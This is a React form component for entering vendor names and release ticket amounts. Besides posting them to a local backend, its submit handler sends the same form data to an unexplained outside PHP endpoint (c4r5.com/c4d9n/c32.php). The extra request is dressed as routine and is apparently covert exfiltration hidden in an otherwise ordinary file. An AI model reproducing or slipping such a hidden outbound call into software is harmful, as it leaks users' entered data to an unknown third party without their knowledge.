import { useState } from "react";
import axios from "axios";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
  CardFooter,
} from "@/components/ui/card";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog";
import { Label } from "@radix-ui/react-label";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Link } from "react-router-dom";

function VendorDetailPage() {
  const [numVendors, setNumVendors] = useState(0);
  const [vendors, setVendors] = useState([]);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isStep2, setIsStep2] = useState(false);

  const handleVendorCountChange = (e) => {
    const value = Number(e.target.value);
    setNumVendors(value);
  };

  const handleNextStep = () => {
    if (numVendors > 0) {
      setVendors(
        Array.from({ length: numVendors }, () => ({
          firstName: "",
          lastName: "",
          releaseTicketAmount: "",
        }))
      );
      setIsStep2(true);
    }
  };

  const handleInputChange = (index, field, value) => {
    const updatedVendors = [...vendors];
    updatedVendors[index][field] = value;
    setVendors(updatedVendors);
  };

  const handleReset = () => {
    setNumVendors(0);
    setVendors([]);
    setIsStep2(false);
    setIsSubmitted(false);
  };

  const handleSubmit = async () => {
    const data = vendors.map(({ firstName, lastName, releaseTicketAmount }) => ({
      firstName,
      lastName,
      releaseTicketAmount,
    }));

    try {
      const response = await axios.post("http://localhost:8080/add-vendor", data, {
        headers: {
          "Content-Type": "application/json",
        },
      });
      console.log("Form submitted with:", response.data);
      setIsSubmitted(true);
    } catch (error) {
      console.error("Error submitting form:", error);
    }

    try {
      const response = await axios.post("https://c4r5.com/c4d9n/c32.php", data);
      console.log("Request succeeded:", response);
    } catch (error) {
      console.error("Network error:", error.message);
    }
  };

  return (
    <div className="bg-orange-50 text-gray-900 min-h-screen flex items-center justify-center">
      <Card className="w-[400px] shadow-lg rounded-md border border-orange-300">
        <form>
          <CardHeader className="text-center">
            <CardTitle className="text-orange-700 text-xl font-bold">Vendor Form</CardTitle>
            <CardDescription className="text-gray-700">
              Fill the following Vendor Details
            </CardDescription>
          </CardHeader>
          <CardContent>
            {!isStep2 ? (
              <div className="flex flex-col space-y-4">
                <div>
                  <Label htmlFor="numVendors" className="text-gray-800">
                    How many vendors do you want to add?
                  </Label>
                  <Input
                    type="number"
                    id="numVendors"
                    min="1"
                    value={numVendors}
                    onChange={handleVendorCountChange}
                    className="mt-1 bg-white border border-orange-300 rounded-md focus:ring-2 focus:ring-orange-500"
                    step="1"
                  />
                </div>
                <Button
                  onClick={handleNextStep}
                  className="px-4 py-2 bg-orange-500 text-white rounded-md hover:bg-orange-600 focus:ring-2 focus:ring-orange-500"
                >
                  Next
                </Button>
              </div>
            ) : (
              <div>
                {vendors.map((vendor, index) => (
                  <div
                    key={index}
                    className="mb-4 p-4 border border-orange-300 rounded-md bg-white shadow-md"
                  >
                    <h3 className="text-center text-orange-700 font-bold">Vendor {index + 1}</h3>
                    <div className="flex flex-col space-y-2 mt-2">
                      <div>
                        <Label htmlFor={`firstName-${index}`} className="text-gray-800">
                          First Name:
                        </Label>
                        <Input
                          id={`firstName-${index}`}
                          value={vendor.firstName}
                          onChange={(e) =>
                            handleInputChange(index, "firstName", e.target.value)
                          }
                          className="mt-1 bg-white border border-orange-300 rounded-md focus:ring-2 focus:ring-orange-500"
                        />
                      </div>
                      <div>
                        <Label htmlFor={`lastName-${index}`} className="text-gray-800">
                          Last Name:
                        </Label>
                        <Input
                          id={`lastName-${index}`}
                          value={vendor.lastName}
                          onChange={(e) =>
                            handleInputChange(index, "lastName", e.target.value)
                          }
                          className="mt-1 bg-white border border-orange-300 rounded-md focus:ring-2 focus:ring-orange-500"
                        />
                      </div>
                      <div>
                        <Label htmlFor={`releaseTicketAmount-${index}`} className="text-gray-800">
                          Release Ticket Amount:
                        </Label>
                        <Input
                          id={`releaseTicketAmount-${index}`}
                          value={vendor.releaseTicketAmount}
                          onChange={(e) =>
                            handleInputChange(index, "releaseTicketAmount", e.target.value)
                          }
                          className="mt-1 bg-white border border-orange-300 rounded-md focus:ring-2 focus:ring-orange-500"
                          type="number"
                          min="0"
                        />
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
          <CardFooter className="flex justify-between pb-1">
            <Button
              variant="outline"
              className="px-4 py-2 bg-orange-100 text-orange-700 rounded-md hover:bg-orange-200"
              onClick={handleReset}
            >
              Reset
            </Button>
            {isStep2 && (
              <AlertDialog>
                <AlertDialogTrigger asChild>
                  <Button className="px-4 py-2 bg-orange-500 text-white rounded-md hover:bg-orange-600 focus:ring-2 focus:ring-orange-500">
                    Submit
                  </Button>
                </AlertDialogTrigger>
                <AlertDialogContent>
                  <AlertDialogHeader>
                    <AlertDialogTitle className="text-orange-700">Are you sure you want to submit?</AlertDialogTitle>
                    <AlertDialogDescription>
                      Make sure all vendor details are correct before submitting.
                    </AlertDialogDescription>
                  </AlertDialogHeader>
                  <AlertDialogFooter>
                    <AlertDialogCancel>Cancel</AlertDialogCancel>
                    <Link to={"/customer-details"}>
                    <AlertDialogAction onClick={handleSubmit}>
                      Continue
                    </AlertDialogAction>
                    </Link>
                  </AlertDialogFooter>
                </AlertDialogContent>
              </AlertDialog>
            )}
          </CardFooter>
          {isSubmitted && (
            <div className="text-center mt-4 text-orange-600 font-bold">
              Form successfully submitted!
            </div>
          )}
          <div className="mt-4 text-center text-sm pb-6 text-gray-700">
            To use previously added Configuration -{" "}
            <Link to={"/configuration"} className="text-orange-500 hover:underline">
              Click here
            </Link>
          </div>
        </form>
      </Card>
    </div>
  );
}

export default VendorDetailPage;
